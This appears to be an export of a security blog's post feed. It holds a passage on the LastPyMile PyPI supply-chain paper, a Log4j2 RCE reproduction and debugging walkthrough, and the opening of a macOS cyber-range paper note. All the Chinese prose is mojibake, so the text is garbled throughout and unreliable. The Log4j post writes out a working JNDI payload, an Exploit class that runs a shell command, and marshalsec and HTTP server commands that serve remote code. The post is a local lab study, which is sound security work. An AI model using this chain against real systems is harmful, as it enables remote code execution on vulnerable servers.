ä¸­çš„ä¸€å°éƒ¨åˆ†ã€‚è¿™ä¹Ÿæ˜¯ä½œè€…çš„ç ”ç©¶èšç„¦ç‚¹ã€‚</p><h2 id="0x02-Method"><a href="#0x02-Method" class="headerlink" title="0x02 Method"></a>0x02 Method</h2><h3 id="RQ1-æ˜¯å¦å­˜åœ¨ä¸€ç§æ–¹æ³•èƒ½å¤Ÿæœ‰æ•ˆåœ°è¯†åˆ«å…¶ä¸­çš„å·®å¼‚æ€§ï¼Ÿ"><a href="#RQ1-æ˜¯å¦å­˜åœ¨ä¸€ç§æ–¹æ³•èƒ½å¤Ÿæœ‰æ•ˆåœ°è¯†åˆ«å…¶ä¸­çš„å·®å¼‚æ€§ï¼Ÿ" class="headerlink" title="RQ1: æ˜¯å¦å­˜åœ¨ä¸€ç§æ–¹æ³•èƒ½å¤Ÿæœ‰æ•ˆåœ°è¯†åˆ«å…¶ä¸­çš„å·®å¼‚æ€§ï¼Ÿ"></a>RQ1: æ˜¯å¦å­˜åœ¨ä¸€ç§æ–¹æ³•èƒ½å¤Ÿæœ‰æ•ˆåœ°è¯†åˆ«å…¶ä¸­çš„å·®å¼‚æ€§ï¼Ÿ</h3><p>æœ‰ä¸€ç§ç°æˆçš„è§£å†³æ–¹æ¡ˆï¼Œå³git logï¼Œä½†æ˜¯æƒ³è¦æ‹¿åˆ°å®Œæ•´çš„ä¿¡æ¯éœ€è¦éå†æ‰€æœ‰gitæ—¥å¿—ä¸­çš„ä¿®è®¢ï¼Œä¸”åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­æ¯æ¬¡è°ƒç”¨éƒ½ä¼šäº§ç”Ÿä¸€ä¸ªè¿›ç¨‹ï¼Œè¿™æ— ç–‘æ˜¯å¢åŠ äº†åˆ†ææœºå™¨çš„è´Ÿæ‹…ã€‚ä½œè€…çš„è§£å†³åŠæ³•åˆ™æ˜¯é€šè¿‡å·§å¦™åœ°ç»“åˆè½¯ä»¶åŒ…å’Œè¿è¡Œè½¯ä»¶çš„æ‰€æœ‰å¿…éœ€é¡¹ç›®çš„æ•£åˆ—å€¼ï¼Œä»¥ä¸€ç§å¯æ‰©å±•çš„æ–¹å¼æå–è¿™äº›å·®å¼‚ã€‚</p><p><strong>Answer</strong><br>ä½œè€…æå‡ºäº†ä¸€ç§æ–¹æ³•ç”¨äºè§£ç­”è¿™ä¸ªé—®é¢˜ï¼Œå°†å…¶å‘½åä¸ºLastPyMileï¼Œæ•´ä½“æ¡†æ¶å¦‚ä¸‹ã€‚</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/754804b7-7d32-4a71-b550-66ed0d5ef99a.png"></p><p>å›¾çš„ä¸ŠåŠéƒ¨åˆ†å±•ç¤ºäº†åŒ…å­˜å‚¨åº“ï¼ˆå¦‚PyPIï¼‰ä¸­å®‰å…¨å®¡æŸ¥çš„å…¸å‹è¿‡ç¨‹ï¼Œä¸»è¦æ˜¯è¯†åˆ«è½¯ä»¶é¡¹ç›®å‘å¸ƒæœŸé—´å¯èƒ½ä¼šå‡ºç°çš„å¯ç–‘ç»„ä»¶ã€‚è€Œåœ¨å›¾çš„ä¸‹åŠéƒ¨åˆ†åˆ™å±•ç¤ºäº†LastPyMileæ˜¯å¦‚ä½•å¢å¼ºä¼ ç»Ÿå®‰å…¨å®¡æŸ¥è¿‡ç¨‹çš„ï¼Œå…·ä½“æ­¥éª¤åŒ…æ‹¬ï¼š</p><ol start="0"><li>åœ¨é¢„å¤‡è¿‡ç¨‹ä¸­ï¼ŒLastPyMileä¼šåœ¨å„å¤„æ”¶é›†PyPIåŒ…çš„Githubé“¾æ¥ï¼ŒåŒ…æ‹¬å…ƒæ•°æ®ã€ä¸»é¡µä»¥åŠåŒ…å†…ã€‚</li><li>éå†è¯¥åŒ…Githubä»£ç åº“ä¸­æ‰€æœ‰å†å²commitï¼Œä»¥è®¡ç®—æ‰€æœ‰æ–‡ä»¶çš„å“ˆå¸Œå€¼å¹¶æ”¶é›†ä»£ç åº“ä¸­æ–‡ä»¶è¡Œæ•°ã€‚</li><li>åœ¨æ”¶é›†äº†Githubä»£ç åº“ä¸­æ‰€æœ‰æ–‡ä»¶çš„å“ˆå¸Œå€¼å’Œè¡Œæ•°åï¼Œå¯¹PyPIåŒ…è¿›è¡Œæ‹†è§£ï¼Œè®¡ç®—å…¶ä¸­ç»„ä»¶å“ˆå¸Œå€¼å¹¶åˆ‡æ”¶é›†æ–‡ä»¶è¡Œæ•°ã€‚</li><li>å¯¹äºPyPIåŒ…ä¸­ç»„ä»¶å“ˆå¸Œå€¼å’Œè¡Œæ•°ä¸ä»£ç åº“ä¸­æ–‡ä»¶å“ˆå¸Œå€¼å’Œè¡Œæ•°ï¼Œä»¥ç¡®å®šå…¶å·®å¼‚æ€§ã€‚</li></ol><h3 id="RQ2-æºä»£ç å’ŒåŒ…å­˜å‚¨åº“ä¹‹é—´çš„â€œæ­£å¸¸â€å·®å¼‚æœ‰å¤šå¤§ï¼Ÿ"><a href="#RQ2-æºä»£ç å’ŒåŒ…å­˜å‚¨åº“ä¹‹é—´çš„â€œæ­£å¸¸â€å·®å¼‚æœ‰å¤šå¤§ï¼Ÿ" class="headerlink" title="RQ2: æºä»£ç å’ŒåŒ…å­˜å‚¨åº“ä¹‹é—´çš„â€œæ­£å¸¸â€å·®å¼‚æœ‰å¤šå¤§ï¼Ÿ"></a>RQ2: æºä»£ç å’ŒåŒ…å­˜å‚¨åº“ä¹‹é—´çš„â€œæ­£å¸¸â€å·®å¼‚æœ‰å¤šå¤§ï¼Ÿ</h3><p>ä½œè€…ç ”ç©¶äº†PyPIç”Ÿæ€ä¸­è¶…è¿‡2000ä¸ªæµè¡Œçš„è½¯ä»¶åŒ…ï¼Œè¿™ç§å·®å¼‚æ˜¯æ™®éå­˜åœ¨çš„ã€‚ä½†åœ¨Pythonæºæ–‡ä»¶ä¸­ä¸€èˆ¬åªä¼šå‘ç”Ÿå¾ˆå°‘çš„ä¿®æ”¹ï¼Œæ‰€ä»¥ä½œè€…é‡‡ç”¨å®¡æŸ¥ä½œä¸ºæ›¿ä»£æ–¹æ¡ˆã€‚</p><p><strong>Answer</strong>  </p><ol><li>æ¯”è¾ƒPyPIä¸­çš„ä»£ç å’Œç›¸åº”çš„æºä»£ç åº“ï¼Œå¹³å‡æœ‰5.8%çš„è¿è¡Œæ—¶éœ€è¦æ–‡ä»¶å’Œ2.6%çš„æ™®é€šæ–‡ä»¶æœ‰å·®å¼‚ã€‚</li></ol><p>ä½œè€…æåˆ°äº†å¯ç–‘APIsçš„è°ƒç”¨ï¼Œè¯´ä¸èƒ½ç®€å•åœ°å°†è°ƒç”¨å®šä¹‰ä¸ºå¯ç–‘ï¼Œä¼šäº§ç”Ÿå¤§é‡å‘Šè­¦ã€‚è¿™é‡Œå­˜ç–‘ï¼Œå› ä¸ºå‘Šè­¦å’Œæ¼æŠ¥çš„å¹³è¡¡ç‚¹å®åœ¨æ˜¯å¾ˆéš¾ç•Œå®šã€‚ä¸è¿‡ä½œè€…ç»™å‡ºäº†å·®å¼‚æ€§æœ€å¤§çš„æ–‡ä»¶åï¼Œå¦‚ä¸‹è¡¨ã€‚<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/86560a0d-be0c-494a-a98d-a46dcfda92ed.png" width="50%" height="50%" /></p><h3 id="RQ3-LastPyMileèƒ½å¦ä¸è½¯ä»¶åŒ…æ‰«æå™¨ç›¸ç»“åˆï¼ŒåŒæ—¶ä¿æŒå¯æ§çš„è­¦æŠ¥æ•°é‡ï¼Ÿ"><a href="#RQ3-LastPyMileèƒ½å¦ä¸è½¯ä»¶åŒ…æ‰«æå™¨ç›¸ç»“åˆï¼ŒåŒæ—¶ä¿æŒå¯æ§çš„è­¦æŠ¥æ•°é‡ï¼Ÿ" class="headerlink" title="RQ3: LastPyMileèƒ½å¦ä¸è½¯ä»¶åŒ…æ‰«æå™¨ç›¸ç»“åˆï¼ŒåŒæ—¶ä¿æŒå¯æ§çš„è­¦æŠ¥æ•°é‡ï¼Ÿ"></a>RQ3: LastPyMileèƒ½å¦ä¸è½¯ä»¶åŒ…æ‰«æå™¨ç›¸ç»“åˆï¼ŒåŒæ—¶ä¿æŒå¯æ§çš„è­¦æŠ¥æ•°é‡ï¼Ÿ</h3><p><strong>Answer</strong><br>ä¸ºäº†åœ¨è¯¥é¢†åŸŸå‘æŒ¥æ•ˆåŠ›ï¼Œåº”è¯¥å…è®¸å¼€å‘è€…å’Œå¼€å‘ç»„ç»‡ä½¿ç”¨ç›¸åŒçš„å·¥å…·æ¥æ‰«æè½¯ä»¶åŒ…çš„æºä»£ç åº“ï¼Œä½œä¸ºå…¶å®¡æŸ¥è¿‡ç¨‹çš„ä¸€éƒ¨åˆ†ã€‚ç»“åˆLastPyMileå¯ä»¥æ˜¾è‘—é™ä½ç°æœ‰æ£€æµ‹è½¯ä»¶çš„å‘Šè­¦æ•°é‡</p><h2 id="0x03-Conclusion"><a href="#0x03-Conclusion" class="headerlink" title="0x03 Conclusion"></a>0x03 Conclusion</h2><p>ä½œè€…è°ƒç ”äº†å·²å‘å¸ƒçš„PyPIåŒ…å’Œæºä»£ç åº“ä¹‹é—´çš„å·®å¼‚æ€§ï¼Œä»¥äº†è§£è½¯ä»¶å‘å¸ƒè¿‡ç¨‹ä¸­æ¶æ„ä»£ç æ³¨å…¥çš„å®‰å…¨é£é™©ã€‚ä½†ä½œè€…è¡¨æ˜è¿™å…¶ä¸­è¿˜æ˜¯ä¼šæœ‰äº›é—®é¢˜ï¼Œæ¯”å¦‚æ¶æ„ä»£ç è¿˜å¯ä»¥éšè—åœ¨ç½‘é¡µã€é¡¹ç›®é…ç½®æ–‡ä»¶ç­‰å…¶ä»–ä½ç½®ï¼Œç”šè‡³æ˜¯requirements.txtä¸­ã€‚è¯»è€…åœ¨è¯»å®Œè¿™ç¯‡æ–‡ç« åä¹ŸåŒæ ·è®¤ä¸ºåªè€ƒè™‘äº†pyæ–‡ä»¶ä¸­çš„å·®å¼‚æ€§å…¶å®æ˜¯ä¸å¤Ÿçš„ï¼Œä¸€æ—¦æ”»å‡»è€…æå‰ä¸Šä¼ ä¸€ä¸ªæ¶æ„åŒ…ï¼Œç„¶åé€šè¿‡ä¿®æ”¹requirements.txtå¼•å…¥è¯¥æ¶æ„åŒ…ä¾¿èƒ½è½»æ¾ç»•è¿‡è¿™ç§æ£€æµ‹æ–¹å¼ï¼Œè¿™é‡Œè¿˜éœ€è¦æ·±å…¥ç ”ç©¶PyPIåŒ…çš„å®‰è£…å’Œå¯¼å…¥è¿‡ç¨‹ï¼Œåˆ¶å®šæ›´åŠ å…¨é¢çš„æ£€æµ‹æ–¹æ³•ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Re Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Supply Chain Attack </tag>
            
            <tag> ESEC/FSE&#39;21 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VA - Log4j2 RCE</title>
      <link href="/2021/12/15/Log4j%20Analysis/"/>
      <url>/2021/12/15/Log4j%20Analysis/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æ¼æ´é¢„è­¦å‘å¸ƒçš„ç¬¬ä¸€å¤©ï¼Œç½‘ä¸Šå°±å·²ç»æœ‰äº†pocäº†ï¼Œä¹Ÿç®—æ˜¯ç«å‡ºåœˆäº†ï¼Œå—å½±å“çš„æœåŠ¡çœŸçš„æ˜¯å¤ªå¤šäº†ã€‚æœ¬æ‰“ç®—ç¬¬äºŒå¤©è°ƒè¯•åä¾¿å†™ä¸€å†™è®°å½•ï¼Œç»“æœä¸€ç›´å› ä¸ºå„ç§äº‹æ‹–åˆ°ä»Šå¤©ï¼Œè¯»ç ”çœŸæ˜¯å¤ªéš¾äº†ã€‚</p></blockquote><h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><p>ä»é›¶å¼€å§‹ï¼ŒSteps</p><p>ä»IDEAé‡Œæ–°å»ºä¸€ä¸ªprojectï¼Œé€‰æ‹©mavené¡¹ç›®ï¼Œä¸ä½¿ç”¨æ¨¡æ¿ï¼Œé»˜è®¤åˆ›å»ºå°±å¥½ã€‚ç„¶åæ–°å»ºéœ€è¦çš„æµ‹è¯•ç±»ï¼Œexpçš„ç±»å¯ä»¥éšæ„æ”¾ï¼Œè¿™é‡Œæˆ‘ä¸ºäº†æ–¹ä¾¿å°±æ”¾åˆ°åŒä¸€ç›®å½•ä¸‹äº†ï¼Œè¿™æ˜¯æœ€ç»ˆçš„ç›®å½•ç»“æ„</p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214173249211.png" alt="image-20211214173249211" style="zoom:50%;" /><p>å…¶ä¸­log4jä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">log4j</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Logger log = LogManager.getLogger(log4j.class);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        log.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:9999/Exploit&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Exploitä»£ç ï¼ˆç®€å•å¼¹ä¸ªè®¡ç®—å™¨ï¼‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String cmd = <span class="string">&quot;open -a /System/Applications/Calculator.app&quot;</span>;</span><br><span class="line">            Process p = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            p.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨marshalsecè¿›è¡Œjndiæ³¨å…¥ï¼Œé¦–å…ˆjavacç¼–è¯‘ç”Ÿæˆclassæ–‡ä»¶ï¼Œå†å¯åŠ¨ä¸€ä¸ªä¸´æ—¶httpæœåŠ¡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8888</span><br></pre></td></tr></table></figure><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214175110927.png" alt="image-20211214175110927" style="zoom:50%;" /><p>ç„¶å</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8888/\#Exploit 9999</span><br></pre></td></tr></table></figure><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214175019635.png" alt="image-20211214175019635" style="zoom: 50%;" /><p>æœ€åæ‰§è¡Œlog4j:main()</p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214175344848.png" alt="image-20211214175344848" style="zoom: 50%;" /><p>è¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„æƒ…å†µï¼Œpythonå¯èµ·æ¥çš„httpæœåŠ¡å¹¶ä¸ä¼šæ˜¾ç¤ºmarshalsecè½¬å‘è¿‡æ¥çš„è¯·æ±‚</p><h2 id="è°ƒç”¨æ ˆ"><a href="#è°ƒç”¨æ ˆ" class="headerlink" title="è°ƒç”¨æ ˆ"></a>è°ƒç”¨æ ˆ</h2><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214193423862.png" alt="image-20211214193423862" style="zoom:33%;" /><p>å…¥å£å‡½æ•°ä¸ºlogIfEnabledï¼Œé™¤äº†errorè°ƒç”¨ä¹‹å¤–ï¼Œè¿˜æœ‰infoã€debugã€fatalã€logã€traceã€warn</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214193516207.png" alt="image-20211214193516207"></p><p>ä½†åœ¨æµ‹è¯•åå‘ç°ï¼Œä»¥traceä¸ºä¾‹å­ï¼Œåœ¨è¿™é‡Œçš„intLevelä¼šå¯¼è‡´è¿”å›falseï¼Œä»è€Œç›´æ¥ç»“æŸæ•´ä¸ªä»£ç æµç¨‹</p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214194632121.png" alt="image-20211214194632121" style="zoom:50%;" /><p>è¿™é‡Œçš„this.intLevelåº”è¯¥æ˜¯é»˜è®¤çš„200ï¼Œè€Œlevel.intLevelå…·ä½“ä¸ºï¼š</p><table><thead><tr><th align="left">Standard Level</th><th align="left">intLevel</th></tr></thead><tbody><tr><td align="left">OFF</td><td align="left">0</td></tr><tr><td align="left">FATAL</td><td align="left">100</td></tr><tr><td align="left">ERROR</td><td align="left">200</td></tr><tr><td align="left">WARN</td><td align="left">300</td></tr><tr><td align="left">INFO</td><td align="left">400</td></tr><tr><td align="left">DEBUG</td><td align="left">500</td></tr><tr><td align="left">TRACE</td><td align="left">600</td></tr><tr><td align="left">ALL</td><td align="left">Integer.MAX_VALUE</td></tr></tbody></table><p>æ‰€ä»¥ç½‘ä¸Šè¯´çš„å¤§éƒ¨åˆ†èƒ½è§¦å‘æ˜¯æœ‰é—®é¢˜çš„ï¼ˆå½“ç„¶ï¼Œä¿®è®¢è¿‡é…ç½®çš„å¦è¯´ğŸ¥ºï¼‰ï¼Œé»˜è®¤æƒ…å†µä¸‹fatalå’Œerrorå¯ä»¥è§¦å‘</p><p>è¨€å½’æ­£ä¼ ï¼Œæ ¹æ®è°ƒç”¨æ ˆï¼Œè·Ÿç€èµ°ä¸€éå¤§æ¦‚å°±èƒ½ç†æ¸…æ¥šæ•´ä¸ªæµç¨‹</p><p>è¿™é‡Œä¸»è¦è®°å½•ä¸‹æ ¸å¿ƒçš„å…³é”®ç‚¹ï¼Œä¸€æ˜¯formatå‡½æ•°</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214200656183.png" alt="image-20211214200656183"></p><p>ä¸»è¦æ˜¯çœ‹åˆ°ä¸‹æ–­ç‚¹è¿™é‡Œï¼Œä»–å¯¹${è¿™ä¸¤ä¸ªç´§é‚»çš„å­—ç¬¦åšäº†æ£€æµ‹ï¼Œä¸€æ—¦åŒ¹é…åˆ°ç±»ä¼¼äºè¡¨è¾¾å¼ç»“æ„çš„å­—ç¬¦ä¸²å°±ä¼šè§¦å‘ä¸‹é¢æµç¨‹ä¸­çš„æ›¿æ¢æœºåˆ¶(this.config.getStrSubstitutor.replace)</p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214201000993.png" alt="image-20211214201000993" style="zoom:50%;" /><p>æ¥çœ‹è¯¦ç»†çš„å‡½æ•°å†…åˆå§‹åŒ–æƒ…å†µ</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214201314019.png" alt="image-20211214201314019"></p><p>å¯ä»¥çœ‹åˆ°å…¶å®šä¹‰äº†prefixMatcherä¸º[$, {]ï¼ŒsuffixMatcherä¸º[}]ï¼Œè¿™é‡Œçš„ç›®çš„æ˜¯æŠŠ${}ä¸­é—´çš„å­—ç¬¦ä¸²æŠ å‡ºæ¥ï¼Œä»¥å°†varNameçš„å€¼èµ‹ä¸ºjndi:ldap://127.0.0.1:9999/Exploitï¼Œå¹¶éšåä¼ é€’ç»™this.resolveVariable()ï¼Œè€Œè¿™ä¸ªå‡½æ•°åˆåšäº†ä¸€ä»¶ä»€ä¹ˆäº‹å‘¢ï¼Œçœ‹ä¸‹é¢</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214204056033.png" alt="image-20211214204056033"></p><p>æ”¯æŒçš„resolveræœ‰dateã€javaã€markerã€ctxã€lowerã€upperã€jndiã€mainã€jvmrunargsã€sysã€envã€log4jï¼Œå…¶ä¸­lowerå’Œupperä¹Ÿæ˜¯åé¢ç”¨æ¥ç»•è¿‡å¸¸ç”¨çš„æ–¹æ³•ï¼Œæ›´è¿›ä¸€æ­¥</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214204305707.png" alt="image-20211214204305707"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯å†™æ­»äº†åŒ¹é…ç¬¬ä¸€ä¸ª:çš„ï¼Œä½œä¸ºprefixï¼Œç„¶åä¼šå¯¹åº”å»æ‰¾å…¶å®ç°ï¼Œæˆ‘è¿™é‡Œæ˜¯jndiï¼Œæ•…åç»­éƒ½æ˜¯èµ°çš„JndiLookupç±»ï¼Œåç»­å¦‚å›¾ï¼Œç›´åˆ°è°ƒç”¨åŸç”Ÿlookupå‡½æ•°</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214204552398.png" alt="image-20211214204552398"></p><p>è‡³æ­¤ç»“æŸ</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™åº”è¯¥ç®—å¾—ä¸Šæ˜¯æˆ‘ç¬¬ä¸€æ¬¡å­¦ä¹ å’Œè°ƒè¯•Java 1dayï¼Œæœ‰å¾ˆå¤šéƒ½æ˜¯è¾¹å­¦è¾¹æŸ¥è¾¹ç†è§£è¾¹å†™ï¼Œä¹Ÿè®¸è¿˜æœ‰å¾ˆå¤šç†è§£æœ‰è¯¯çš„åœ°æ–¹ï¼Œç­‰ä»¥åç²¾è¿›äº†ä¹‹åå†å›æ¥è¯»å’Œåæ€ï¼Œè¿™ä¹Ÿæ˜¯è®°å½•çš„ç›®çš„ä¹‹ä¸€ã€‚åªå¸Œæœ›è‡ªå·±èƒ½å¤ŸåšæŒä¸‹æ¥ï¼Œä¸€å®šèƒ½æœ‰æ”¶è·ï¼åŠ æ²¹ğŸ¤©</p>]]></content>
      
      
      <categories>
          
          <category> Vulnerability Analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Supply Chain Attack </tag>
            
            <tag> 1day </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - POSTER: Construct macOS Cyber Range for Red/Blue Teams</title>
      <link href="/2021/12/07/POSTER%20-%20Construct%20macOS%20Cyber%20Range%20for%20Red%20-%20Blue%20Teams/"/>
      <url>/2021/12/07/POSTER%20-%20Construct%20macOS%20Cyber%20Range%20for%20Red%20-%20Blue%20Teams/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>åŸæ–‡ä½œè€…ï¼šYH Chen, YD Lin, CK Chen, CL Lei</em></p><p><em>åŸæ–‡æ ‡é¢˜ï¼šPOSTER: Construct macOS Cyber Range for Red/Blue Teams</em></p><p><em>åŸæ–‡é“¾æ¥ï¼š<a href="https://dl.acm.org/doi/abs/10.1145/3320269.3405449">https://dl.acm.org/doi/abs/10.1145/3320269.3405449</a></em></p><p><em>åŸæ–‡æ¥æºï¼šASIA CCS 2020</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p></blockquote><h2 id="0x01-Intro"><a href="#0x01-Intro" class="headerlink" title="0x01 Intro"></a>0x01 Intro</h2><p>è¿™æ˜¯ä¸€ç¯‡å‘å¸ƒåœ¨ASIA CCS 2020çš„POSTERï¼Œä½œè€…èšç„¦äºç°ä»Šè¶Šæ¥è¶Šå¤šæ¶æ„åº”ç”¨ç¨‹åºå’ŒAPTæ”»å‡»å°†MacOSä½œä¸ºæ”»å‡»ç›®æ ‡è¿™ä¸€æƒ…å†µå±•å¼€ç ”ç©¶ã€‚é€ æˆè¿™ä¸€æƒ…å†µçš„åŸå› åœ¨è¯»è€…çœ‹æ¥æœ‰äºŒï¼Œä¸€æ˜¯MacOSçš„æ™®åŠï¼Œè¿™ä¸»è¦æ˜¯M1çš„é«˜æ€§èƒ½è¡¨ç°å¸å¼•äº†å¾ˆå¤šæ–°ç”¨æˆ·è½¬å‘MacOSï¼›äºŒæ˜¯å®‰å…¨è¡Œä¸šç›¸å…³ä»ä¸šäººå‘˜ä¹Ÿæœ‰ä½¿ç”¨MacOSçš„ä¹ æƒ¯ï¼Œæœ€è¿‘å‡ å¹´è¿™äº›å®‰å…¨è¡Œä¸šä»ä¸šäººå‘˜ä¹Ÿæˆä¸ºäº†APTç»„ç»‡çš„æ”»å‡»ç›®æ ‡ï¼Œå‰æ®µæ—¶å€™æ‰çœ‹åˆ°äº†ä¸€ä¸ªAPTç»„ç»‡åœ¨æ¨ç‰¹å…»å·ï¼Œç„¶åå‘å¸ƒç ´è§£äº†çš„ã€å·ç§°â€œæ— åé—¨â€çš„å®‰å…¨æ–¹é¢çš„å·¥å…·ä»¥ä¾µå…¥å®‰å…¨è¡Œä¸šä»ä¸šäººå‘˜ç§äººç”µè„‘çš„æ”»å‡»æ‰‹æ®µã€‚</p><p>ç»¼ä¸Šï¼Œä½œè€…è§‚å¯Ÿåˆ°ç›®å‰ç ”ç©¶å·¥ä½œå¾ˆå°‘è®¨è®ºåœ¨MacOSä¸Šçš„æ”»å‡»å’Œé˜²å¾¡æŠ€æœ¯ï¼ŒåŒ…æ‹¬æ”»å‡»æ–¹æ³•ã€é˜²æŠ¤æ‰‹æ®µä»¥åŠå®¡æŸ¥å·¥å…·ã€‚æ‰€ä»¥ä½œè€…ä¾¿å°è¯•æ„å»ºä¸€ä¸ªç”¨äºè¯„ä¼°çº¢é˜Ÿå’Œè“é˜Ÿçš„MacOSç½‘ç»œé¶åœºï¼Œä»¥åˆºæ¿€æ›´å¤šå…³äºMacOSå¨èƒåˆ†æçš„ç ”ç©¶åˆ›æ–°ã€‚</p><h2 id="0x02-Cyber-Range"><a href="#0x02-Cyber-Range" class="headerlink" title="0x02 Cyber Range"></a>0x02 Cyber Range</h2><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/08329f62-83d3-4597-9efb-56a2d849c77c.png"></p><p>ä¸Šå›¾ä¸ºç½‘ç»œé¶åœºçš„ç»“æ„ï¼Œä¸»è¦ç”±ä¸‰ä¸ªéƒ¨åˆ†æ„æˆã€‚é¦–å…ˆï¼Œä½œè€…å»ºç«‹äº†ä¸€ä¸ªæ”»é˜²å…³è”å›¾ï¼Œå®ƒç³»ç»Ÿåœ°æ€»ç»“äº†MacOSä¸­å¯èƒ½å­˜åœ¨çš„æ”»å‡»å’Œé˜²å¾¡æŠ€æœ¯ï¼Œè¯¥å›¾çš„ç›®çš„æ˜¯æè¿°MacOSé¢†åŸŸå†…çš„æ¶æ„è½¯ä»¶/APTäº‹ä»¶ã€æ”»å‡»æŠ€æœ¯ã€æ£€æµ‹å·¥å…·å’Œåˆ†æå·¥å…·ä¹‹é—´çš„æ‰€æœ‰å…³ç³»ã€‚å…¶æ¬¡ï¼Œä½œè€…å¼€å‘äº†ä¸€ä¸ªé€šç”¨çš„RATç”¨äºçº¢é˜Ÿæ¨¡æ‹Ÿæ”»å‡»ï¼Œçº¢é˜Ÿå¯ä»¥å‘åŠ¨æ”»å‡»ã€è®°å½•æ”»å‡»ï¼Œå¹¶ä½¿ç”¨è¯¥å·¥å…·å°†æ”»å‡»æ˜ å°„è‡³ATT&amp;CKçŸ©é˜µä¸­ã€‚ç¬¬ä¸‰ï¼Œä½œè€…é€šè¿‡å¼€æºå·¥å…·å¼€å‘äº†ä¸€ä¸ªè“é˜Ÿç”¨äºæ£€æµ‹å’Œå–è¯è¯„ä¼°çš„å·¥å…·åŒ…ã€‚è“é˜Ÿå¯ä»¥åˆ©ç”¨è¿™ä¸ªå·¥å…·åŒ…ç”Ÿæˆçš„è®°å½•ï¼ˆæ—¥å¿—ã€å‘Šè­¦ç­‰ï¼‰ï¼Œä»¥è¯†åˆ«æ¶æ„è¡Œä¸ºå¹¶æ ‡è®°ATT&amp;CK 